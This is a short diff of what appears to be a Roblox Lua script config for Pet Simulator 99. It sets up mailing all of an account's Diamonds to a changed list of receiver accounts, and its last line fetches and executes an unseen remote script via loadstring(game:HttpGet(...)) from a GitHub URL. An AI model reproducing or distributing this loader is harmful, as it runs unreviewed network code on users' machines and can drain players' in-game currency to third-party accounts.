@@ -16,6 +16,6 @@ _G.DISABLE_OVERLAY = true
 _G.GMAIL_ITEMS = {
   ["Send all Diamonds"] = {Class = "Currency", Id = "Diamonds", KeepAmount = "2m", MinAmount = "10m"},
 }
-_G.GMAIL_RECEIVERS = {"lagwuadiss", "concobjtuu"}
+_G.GMAIL_RECEIVERS = {"Dwi_Sunx", "Fiko_Sungx", "tkm_newz", "Fara_Liux", "Adi_Sukox"}
 _G.GMAIL_DELAY  = 0
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Hoith95/Pet-99/main/GScripts-Events3-ALL"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hoith95/Pet-99/main/GScripts-Events2-ALL"))()
